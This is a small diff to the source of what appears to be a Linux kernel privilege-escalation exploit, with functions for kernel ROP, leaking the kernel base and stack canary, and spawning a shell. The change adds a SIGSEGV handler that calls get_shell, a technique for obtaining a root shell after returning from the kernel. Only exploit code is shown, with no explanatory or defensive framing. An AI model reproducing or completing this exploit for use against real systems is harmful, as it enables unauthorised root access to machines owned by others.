@@ -5,6 +5,7 @@
 #define _GNU_SOURCE
 #include <fcntl.h>
 #include <sched.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -136,6 +137,7 @@ void kernel_rop() {
 
 int main() {
   save_status();
+  signal(SIGSEGV, get_shell);
 
   leak_kbase();
   leak_canary();
